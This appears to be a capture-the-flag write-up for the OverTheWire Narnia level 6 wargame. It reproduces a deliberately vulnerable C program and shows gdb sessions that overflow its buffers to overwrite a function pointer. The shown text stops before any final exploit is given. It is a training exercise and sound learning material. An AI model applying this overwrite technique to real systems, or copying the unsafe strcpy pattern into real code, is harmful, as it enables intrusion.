#Narnia6

narnia.labs.overthewire.org

**Username:** narnia6
**Password:** see [narnia5](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria5)
**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> Let's see what we're working with.
>
>```
# ./narnia6
./narnia6 b1 b2
>```
>
> Not a lot happening, let's look at the source.
>
>```C
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
>
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
>
    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
>
extern char **environ;
>
// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}
>
int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;
>
	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
>
	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));
>
	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	fp(b1);
>
	exit(1);
}
>```
>
> So this looks a little more complex than the previous challenges.  I'm not the best with ```C```, so let's start from the top.  The first bit that I don't quite get is the ```int  (*fp)(char *)=(int(*)(char *))&puts, i;```.  Let's see what's going on here.  After a little googling I was able to get a little information on this line.  Basically we can read this as two separate declarations.  The first is a function pointer ```(*fp)``` to the function ```puts``` and the second is just for an integer ```i```.  That function pointer sounds interesting and really dangerous.  If we can change the pointer to point to something better than ```puts```, then when ```fp(b1)``` is called it will pass our user input to that other function.  I don't see any reference to ```/bin/sh``` in the code like some of the previous challenges so we'll have to find another way to spawn a shell. Let's just poke around a little bit and see if we can find anything.
>
>```
(gdb) run $(python -c 'print "A"') $(python -c 'print "A"*20')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
>
Starting program: /root/narnia6 $(python -c 'print "A"') $(python -c 'print "A"*20')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) run $(python -c 'print "A"*12') $(python -c 'print "A"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
>
Starting program: /root/narnia6 $(python -c 'print "A"*12') $(python -c 'print "A"')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
>```
>
> Well, it looks like we can overflow both parameters but our input doesn't appear to be large enough to stuff shellcode code in there.  We'll have to come up with another way.  Let's go back to the function pointer and take a closer look at that.
>
>```asm
             main:
08048559         push       ebp                                                 ; XREF=_start+23
0804855a         mov        ebp, esp
0804855c         push       ebx                                                 ; argument #1
0804855d         and        esp, 0xfffffff0
08048560         sub        esp, 0x30
08048563         mov        dword [ss:esp+0x28], 0x80483f0
0804856b         cmp        dword [ss:ebp+arg_0], 0x3
0804856f         je         0x8048592
>```
>
> We can see that the function pointer is saving the address ```0x80483f0``` to the stack.  Let's move to gdb and see if we can actually get the memory address where the function pointer is pointing to.
>
>```asm
08048657         mov        eax, dword [ss:ebp+arg_4]
0804865a         add        eax, 0x4
0804865d         mov        eax, dword [ds:eax]
0804865f         mov        dword [ss:esp+0x4], eax                             ; argument "src" for method j_strcpy
08048663         lea        eax, dword [ss:esp+0x20]
08048667         mov        dword [ss:esp], eax                                 ; argument "dst" for method j_strcpy
0804866a         call       j_strcpy
0804866f         mov        eax, dword [ss:ebp+arg_4]
08048672         add        eax, 0x8
08048675         mov        eax, dword [ds:eax]
08048677         mov        dword [ss:esp+0x4], eax                             ; argument "src" for method j_strcpy
0804867b         lea        eax, dword [ss:esp+0x18]
0804867f         mov        dword [ss:esp], eax                                 ; argument "dst" for method j_strcpy
08048682         call       j_strcpy
08048687         mov        eax, dword [ss:esp+0x28]
0804868b         and        eax, 0xff000000
08048690         mov        ebx, eax
08048692         call       get_sp
08048697         cmp        ebx, eax
08048699         jne        0x80486a7
>```
>```asm
             j_printf:
080483d0         jmp        dword [ds:printf@GOT]                               ; printf@GOT, XREF=main+40
>```
